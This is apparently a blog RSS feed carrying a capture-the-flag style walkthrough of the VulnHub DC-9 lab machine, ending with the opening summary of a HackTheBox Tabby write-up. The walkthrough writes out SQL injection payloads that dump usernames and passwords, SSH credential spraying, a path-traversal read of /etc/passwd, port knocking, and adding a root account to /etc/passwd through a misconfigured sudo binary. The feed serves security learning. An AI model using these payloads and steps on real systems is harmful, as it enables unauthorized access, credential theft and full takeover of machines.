@@ -1,0 +1,568 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>LFI on Ef&#39;s log</title>
+    <link>https://fahmifj.github.io/tags/lfi/</link>
+    <description>Recent content in LFI on Ef&#39;s log</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Wed, 02 Jun 2021 01:18:59 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/lfi/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>VulnHub - DC-9</title>
+      <link>https://fahmifj.github.io/writeups/vulnhub/vh-dc9/</link>
+      <pubDate>Wed, 02 Jun 2021 01:18:59 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/vulnhub/vh-dc9/</guid>
+      <description>DC-9 from VulnHub features a website that is vulnerable to SQL injection. Leveraging the SQLi, I&amp;rsquo;m able to dump a bunch of users&#39; credentials. I&amp;rsquo;m able to gain a foothold on the system by spraying these credentials on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write on a file system as root.
+Actually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full nmap scan broke that rule.</description>
+      <content:encoded><![CDATA[<p>DC-9 from VulnHub features a website that is vulnerable to SQL injection. Leveraging the SQLi, I&rsquo;m able to dump a bunch of users' credentials. I&rsquo;m able to gain a foothold on the system by spraying these credentials on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write on a file system as root.</p>
+<p>Actually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full <code>nmap</code> scan broke that rule. So I exploited this machine in an unintended way by skipping the LFI and port knocking.</p>
+<p>Although it may look weird for a writeup, but for the sake of learning, I&rsquo;ll include the intended way (LFI and Port knocking) in the foothold section.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>Blind SQL injection</li>
+<li>Local file Inclusion</li>
+<li>Port knocking</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Nmap</li>
+<li>Arpscan</li>
+<li>SQLMap</li>
+<li>CrackMapExec</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="host-discovery---arp-scan">Host Discovery - arp-scan</h3>
+<p><code>192.168.2.102</code> is the target.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ arp-scan --interface eth0 192.168.2.0/24 | tee scans/00-arp-scan
+Interface: eth0, type: EN10MB, MAC: 08:00:27:0b:94:f0, IPv4: 192.168.2.103
+Starting arp-scan 1.9.7 with <span style="color:#ae81ff">256</span> hosts <span style="color:#f92672">(</span>https://github.com/royhills/arp-scan<span style="color:#f92672">)</span>
+192.168.2.2     0a:00:27:00:00:0a       <span style="color:#f92672">(</span>Unknown: locally administered<span style="color:#f92672">)</span>
+192.168.2.1     08:00:27:d9:63:87       PCS Systemtechnik GmbH
+192.168.2.102   08:00:27:54:bc:fd       PCS Systemtechnik GmbH
+
+<span style="color:#ae81ff">3</span> packets received by filter, <span style="color:#ae81ff">0</span> packets dropped by kernel
+Ending arp-scan 1.9.7: <span style="color:#ae81ff">256</span> hosts scanned in 1.986 seconds <span style="color:#f92672">(</span>128.90 hosts/sec<span style="color:#f92672">)</span>. <span style="color:#ae81ff">3</span> responded
+</code></pre></div><h3 id="port-scan---nmap">Port Scan - nmap</h3>
+<p><code>nmap</code> shows two ports available, 80 (HTTP) and 22 (SSH). SSH port is in filtered state.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ nmap -n -sC -sV -oA scans/10-initial-dc9 <span style="color:#e6db74">&#39;192.168.2.102&#39;</span> -v
+<span style="color:#75715e"># Nmap 7.80 scan initiated Thu Apr  8 02:43:51 2021 as: nmap -n -sC -sV -oA scans/10-initial-dc9 -v 192.168.2.102</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 192.168.2.102
+Host is up <span style="color:#f92672">(</span>0.00048s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">998</span> closed ports
+PORT   STATE    SERVICE VERSION
+22/tcp filtered ssh
+80/tcp open     http    Apache httpd 2.4.38 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.38 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+|_http-title: Example.com - Staff Details - Welcome
+MAC Address: 08:00:27:54:BC:FD <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</code></pre></div><p>But, later it turns into open state after a full port scan performed.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ nmap -n -p22 192.168.2.102
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-04-08 05:21 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 192.168.2.102
+Host is up <span style="color:#f92672">(</span>0.00075s latency<span style="color:#f92672">)</span>.
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+MAC Address: 08:00:27:54:BC:FD <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</code></pre></div><p>I can confirms it with <code>netcat</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ nc 192.168.2.102 <span style="color:#ae81ff">22</span>
+SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>The home page of this site doesn&rsquo;t provide anything useful.</p>
+<p><div class="img-container"><img src="imgs/image-20210408134805695.png" alt="image-20210408134805695"  /></div>
+</p>
+<p>The Display All Records menu functions to display all user records.</p>
+<p><div class="img-container"><img src="imgs/image-20210408134819215.png" alt="image-20210408134819215"  /></div>
+</p>
+<p>There is a user input on the Search menu</p>
+<p><div class="img-container"><img src="imgs/image-20210408134833069.png" alt="image-20210408134833069"  /></div>
+</p>
+<p>The Manage menu has login function.</p>
+<p><div class="img-container"><img src="imgs/image-20210408134853665.png" alt="image-20210408134853665"  /></div>
+</p>
+<p>From here I can assume that the website uses database.</p>
+<h4 id="error-based-sql-injection---detection">Error-based SQL injection - Detection</h4>
+<p>There&rsquo;s error-based SQL injection on <code>search.php</code>. The initial detection is simple, when I try put <code>'</code> it gives bug (joke <a href="https://twitter.com/LiveOverflow/status/1313157161007054854">reference</a> ).</p>
+<p>I detected the SQLi vulnerability by adding a single quote  ( <code>'</code> ) at the end of user&rsquo;s first name that I want to search.</p>
+<p><div class="img-container"><img src="imgs/image-20210602031408130.png" alt="image-20210602031408130"  /></div>
+</p>
+<p>Based on the search page, you can only input one name (either the first or the last name) and it will return a single record, so without <code>'</code>, the search should return one related result.</p>
+<p><div class="img-container"><img src="imgs/image-20210602031344011.png" alt="image-20210602031344011"  /></div>
+</p>
+<p>But then, if I submit <code>' OR 1=1 -- -'</code>, it returns all the records.</p>
+<p><div class="img-container"><img src="imgs/image-20210602030509083.png" alt="image-20210602030509083"  /></div>
+</p>
+<h4 id="error-based-sql-injection---database-examination">Error-based SQL injection - Database examination</h4>
+<p>There are 6 columns available and the data type of each columns is string. The query as follows:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39; UNION SELECT &#39;</span>a<span style="color:#e6db74">&#39;,&#39;</span>b<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#66d9ef">c</span><span style="color:#e6db74">&#39;,&#39;</span>d<span style="color:#e6db74">&#39;,&#39;</span>e<span style="color:#e6db74">&#39;,&#39;</span>f<span style="color:#e6db74">&#39; -- 
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602033329668.png" alt="image-20210602033329668"  /></div>
+</p>
+<p>I&rsquo;ll pull out some information such as database version, current database, and the available databases using this query:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39; UNION SELECT @@version, &#39;</span><span style="color:#66d9ef">Current</span> DB:<span style="color:#e6db74">&#39;, database(), group_concat(SCHEMA_NAME),5,6 FROM information_schema.schemata -- -
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602033848222.png" alt="image-20210602033848222"  /></div>
+</p>
+<p>The website uses MariaDB as its database. The database currently in use is <code>Staff</code>. <code>Staff</code> and <code>users</code> are non-default database, so I&rsquo;ll look into their tables.</p>
+<p>With the following query, I can get the two tables name from database <code>Staff</code>: <code>StaffDetails</code> and <code>Users</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39;UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables where table_schema = &#39;</span>Staff<span style="color:#e6db74">&#39; -- -
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602034617576.png" alt="image-20210602034617576"  /></div>
+</p>
+<p>I&rsquo;ll get the columns on table <code>StaffDetails</code> with the following query:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39; UNION SELECT group_concat(column_name),2,3,4,5,6 FROM information_schema.columns where table_name = &#39;</span>StaffDetails<span style="color:#e6db74">&#39; -- -
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602035249528.png" alt="image-20210602035249528"  /></div>
+</p>
+<p>I&rsquo;ll can retrieve the contents of the Username and Password column with the following query:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39; UNION SELECT group_concat(username, &#39;</span>:<span style="color:#e6db74">&#39;, password),2,3,4,5,6 FROM Users -- -
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602040550090.png" alt="image-20210602040550090"  /></div>
+</p>
+<p>The password is in md5 format.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ echo 856f5de590ef37314e7c3bdf6f8a66dc | wc -c
+<span style="color:#ae81ff">33</span>
+</code></pre></div><p>The hash can be cracked online. The credentials is <code>admin:transorbital1</code></p>
+<p><div class="img-container"><img src="imgs/image-20210602044447046.png" alt="image-20210602044447046"  /></div>
+</p>
+<p>On database <code>users</code>,  there is only one table called <code>UserDetails</code>. Here is the query.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39;UNION SELECT group_concat(table_name),2,3,4,5,6 FROM information_schema.tables where table_schema = &#39;</span>users<span style="color:#e6db74">&#39; -- -
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602041638341.png" alt="image-20210602041638341"  /></div>
+</p>
+<p>With the following query, I can get the columns on table <code>UserDetails</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39; UNION SELECT group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name = &#39;</span>UserDetails<span style="color:#e6db74">&#39; -- -
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602041745247.png" alt="image-20210602041745247"  /></div>
+</p>
+<p><code>UserDetails</code> has 6 columns, but I&rsquo;m interested only with the <code>username</code> and the <code>password</code> column, and I&rsquo;ll pull out the their contents with the following query.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#e6db74">&#39; UNION SELECT group_concat(username,&#34;:&#34;,password),2,3,4,5,6 FROM users.UserDetails -- -
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602041822329.png" alt="image-20210602041822329"  /></div>
+</p>
+<p>That&rsquo;s a lot of credentials. I can sort those creds with <code>sed</code> command by substituting comma with new line.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ echo -n <span style="color:#e6db74">&#39;marym:3kfs86sfd,julied:468sfdfsd2,fredf:4sfd87sfd1,barneyr:RocksOff,tomc:TC&amp;TheBoyz,jerrym:B8m#48sd,wilmaf:Pebbles,bettyr:BamBam01,chandlerb:UrAG0D!,joeyt:Passw0rd,rachelg:yN72#dsd,rossg:ILoveRachel,monicag:3248dsds7s,phoebeb:smellycats,scoots:YR3BVxxxw87,janitor:Ilovepeepee,janitor2:Hawaii-Five-0&#39;</span> | sed -s <span style="color:#e6db74">&#39;s/,/\n/g&#39;</span>
+marym:3kfs86sfd
+julied:468sfdfsd2
+fredf:4sfd87sfd1
+barneyr:RocksOff
+tomc:TC&amp;TheBoyz
+jerrym:B8m#48sd
+wilmaf:Pebbles
+bettyr:BamBam01
+chandlerb:UrAG0D!
+joeyt:Passw0rd
+rachelg:yN72#dsd
+rossg:ILoveRachel
+monicag:3248dsds7s
+phoebeb:smellycats
+scoots:YR3BVxxxw87
+janitor:Ilovepeepee
+janitor2:Hawaii-Five-0
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-chandlerb-joeyt-janitor">Shell as chandlerb, joeyt, janitor</h3>
+<h4 id="ssh-brute-force">SSH Brute-force</h4>
+<p>Since the SSH port is open, I tried all the credentials I obtained from SQLi on SSH using <code>crackmapexec</code>. It returned 3 valid logins.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ crackmapexec ssh 192.168.2.102 -u users -p passwords --no-bruteforce --continue-on-success
+SSH         192.168.2.102   <span style="color:#ae81ff">22</span>     192.168.2.102    <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
+...
+SSH         192.168.2.102   <span style="color:#ae81ff">22</span>     192.168.2.102    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> chandlerb:UrAG0D! 
+SSH         192.168.2.102   <span style="color:#ae81ff">22</span>     192.168.2.102    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> joeyt:Passw0rd 
+...
+SSH         192.168.2.102   <span style="color:#ae81ff">22</span>     192.168.2.102    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> janitor:Ilovepeepee 
+...
+</code></pre></div><h4 id="intended-lfi-and-port-knocking">(Intended) LFI and Port Knocking</h4>
+<p>I discovered an LFI on the website after inspecting its source code</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">chandlerb@dc-9:/var/www/html$ cat manage.php
+</code></pre></div><pre><code class="language-php+HTML" data-lang="php+HTML">&lt;?php
+	$file = 'contact-info.php';
+	$show_errors = $_SESSION['display_errors'];
+      if ($show_errors == 'yes') {
+         if(file_exists($file)) {
+            include($file);
+          } else {
+          	echo &quot;File does not exist&quot; . &quot;&lt;br /&gt;&quot;;
+			$file = $_GET['file']; # LFI vulnerability starts from here
+			include('directory/' . $file); # No validation, poc: manage?file=../../../../etc/passwd
+         }} else {
+          ?&gt;
+</code></pre><p>Using LFI is the intended way to gain a foothold before performing brute force.</p>
+<blockquote>
+<p>Log into the website using <code>admin:transorbital1</code>.</p>
+</blockquote>
+<p>With LFI I can include  <code>/etc/knockd.conf</code> to read the knocking sequence to open the SSH port.</p>
+<p><div class="img-container"><img src="imgs/image-20210602050027114.png" alt="image-20210602050027114"  /></div>
+</p>
+<p>In case the SSH port is closed, then to open it, I&rsquo;ll need to interact with port 7469,8475,9842 sequentially.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#66d9ef">for</span> i in <span style="color:#ae81ff">7469</span> <span style="color:#ae81ff">8475</span> 9842; <span style="color:#66d9ef">do</span> nc -w1 192.168.2.102 $i; <span style="color:#66d9ef">done</span>;
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210602051747909.png" alt="image-20210602051747909"  /></div>
+</p>
+<p>To close the port, I&rsquo;ll need to knock in reverse order:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#66d9ef">for</span> i in <span style="color:#ae81ff">9842</span> <span style="color:#ae81ff">8475</span> 7469; <span style="color:#66d9ef">do</span> nc -w1 192.168.2.102 $i; <span style="color:#66d9ef">done</span>;
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210602052201358.png" alt="image-20210602052201358"  /></div>
+</p>
+<p>Then from here, I should perform SSH brute force.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-fredf">Shell as fredf</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>Only user janitor that has one valuable thing in its home dir, and that is a password list.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt 
+BamBam01
+Passw0rd
+smellycats
+P0Lic#10-4
+B4-Tru3-001
+4uGU5T-NiGHts
+</code></pre></div><p>With those new password, I&rsquo;ll perform another brute force using <code>crackmapexec</code>.</p>
+<h4 id="ssh-brute-force-1">SSH Brute-force</h4>
+<p><code>crackmapexec</code> returns one valid login for <code>fred:B4-Tru3-001</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ crackmapexec ssh 192.168.2.102 -u users -p passwords --no-bruteforce --continue-on-success
+SSH         192.168.2.102   <span style="color:#ae81ff">22</span>     192.168.2.102    <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
+...
+SSH         192.168.2.102   <span style="color:#ae81ff">22</span>     192.168.2.102    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> fredf:B4-Tru3-001 
+...
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@iamf «dc-9» «192.168.2.103»
+$ ssh fredf@192.168.2.102
+fredf@192.168.2.102&#39;s password:
+Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Apr  8 20:10:42 2021 from 192.168.2.103
+fredf@dc-9:~$ id
+uid=1003(fredf) gid=1003(fredf) groups=1003(fredf)
+</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
+<h4 id="sudo-privileges---arbitrary-file-write">Sudo privileges - Arbitrary file write</h4>
+<p>User fredf has sudo privileges on a custom binary called <code>test</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">fredf@dc-9:/home$ sudo -l
+Matching Defaults entries <span style="color:#66d9ef">for</span> fredf on dc-9:
+    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
+
+User fredf may run the following commands on dc-9:
+    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /opt/devstuff/dist/test/test
+</code></pre></div><p>I suspect <code>/opt/devstuff/test.py</code> is the actual code of that binary.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">fredf@dc-9:/opt/devstuff$ cat test.py 
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
+
+<span style="color:#f92672">import</span> sys
+
+<span style="color:#66d9ef">if</span> len (sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">3</span> :
+    <span style="color:#66d9ef">print</span> (<span style="color:#e6db74">&#34;Usage: python test.py read append&#34;</span>)
+    sys<span style="color:#f92672">.</span>exit (<span style="color:#ae81ff">1</span>)
+
+<span style="color:#66d9ef">else</span> :
+    f <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
+    output <span style="color:#f92672">=</span> (f<span style="color:#f92672">.</span>read())
+
+    f <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;a&#34;</span>)
+    f<span style="color:#f92672">.</span>write(output)
+    f<span style="color:#f92672">.</span>close()
+</code></pre></div><p>Let&rsquo;s break it down.</p>
+<p>It checks if the arguments are equal to 3. If it doesn&rsquo;t have 3 arguments, it exits.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">if</span> len (sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">3</span> :
+    <span style="color:#66d9ef">print</span> (<span style="color:#e6db74">&#34;Usage: python test.py read append&#34;</span>)
+    sys<span style="color:#f92672">.</span>exit (<span style="color:#ae81ff">1</span>)
+</code></pre></div><p>Otherwise, it reads a file specified on argv1 in read mode and store its contents to the variable <code>output</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">else</span> :
+    f <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
+    output <span style="color:#f92672">=</span> (f<span style="color:#f92672">.</span>read())
+</code></pre></div><p>Then it opens a file specified on argv2 in append mode and it adds the variable <code>output</code>  (the file contents of argv1) to that file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    f <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;a&#34;</span>)
+    f<span style="color:#f92672">.</span>write(output)
+    f<span style="color:#f92672">.</span>close()
+</code></pre></div><p>This can be exploited in many ways, and one of them is to add a new root account to <code>/etc/passwd</code>.</p>
+<p>First, I&rsquo;ll create a password hash using <code>openssl</code> command.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">fredf@dc-9:/tmp$ openssl passwd -1 -salt iamf pass123
+$1$iamf$lq0NuDAhNy8IFlaFgiRw20
+</code></pre></div><p>I&rsquo;ll follow the flat database format of <code>/etc/passwd</code> to create my own user. I&rsquo;ll use the field property of root user, and substitute the password (<code>x</code> field) and the username with the one I specified.</p>
+<p>Here is what I mean:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># From this</span>
+root:x:0:0:root:/root:/bin/bash
+<span style="color:#75715e"># To</span>
+iamf:$1$iamf$lq0NuDAhNy8IFlaFgiRw20:0:0:root:/root:/bin/bash
+</code></pre></div><p>I&rsquo;ll store that to a file called <code>/tmp/passwd</code>.</p>
+<p>And now I can just append the content of <code>/tmp/passwd</code> to <code>/etc/passwd</code> using <code>/opt/devstuff/dist/test/test</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">fredf@dc-9:/tmp$ sudo /opt/devstuff/dist/test/test /tmp/passwd /etc/passwd
+</code></pre></div><p>I can confirms my account is there (<code>/etc/passwd</code>).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">fredf@dc-9:/tmp$ cat /etc/passwd
+...
+janitor:x:1016:1016:Donald Trump:/home/janitor:/bin/bash
+janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash
+iamf:$1$iamf$lq0NuDAhNy8IFlaFgiRw20:0:0:root:/root:/bin/bash
+</code></pre></div><h4 id="su---iamf">SU - iamf</h4>
+<p>Now I can switch to my account and get a root shell.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">fredf@dc-9:/tmp$ su iamf
+Password: pass123
+root@dc-9:/tmp# whoami
+</code></pre></div><p>And here is the flag,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">root@dc-9:/tmp# cd /root/
+root@dc-9:~# ls
+theflag.txt
+root@dc-9:~# cat theflag.txt 
+
+
+███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
+████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
+██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
+██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
+██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
+╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
+                                                                             
+Congratulations - you have done well to get to this point.
+
+Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
+who have taken the time to complete the various DC challenges.
+
+I also want to send out a big thank you to the various members of @m0tl3ycr3w .
+
+They are an inspirational bunch of fellows.
+
+Sure, they might smell a bit, but...just kidding.  :-)
+
+Sadly, all things must come to an end, and this will be the last ever
+challenge in the DC series.
+
+So long, and thanks for all the fish.
+</code></pre></div><p>That&rsquo;s all, thanks for reading.</p>
+<hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a></li>
+<li><a href="https://crackstation.net/">https://crackstation.net/</a></li>
+<li><a href="https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/">https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Tabby</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-tabby/</link>
+      <pubDate>Mon, 26 Apr 2021 21:26:38 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-tabby/</guid>
+      <description>Tabby is an easy Linux box that starts off by identifying and leveraging an LFI vulnerability to find tomcat credentials. The credentials can be used to gain a foothold on the system by deploying a malicious .war file via Tomcat Manager. Internal enumeration finds a password protected backup file, and it can be cracked to recover the password. The password turns out to be reused by the user on the box.</description>
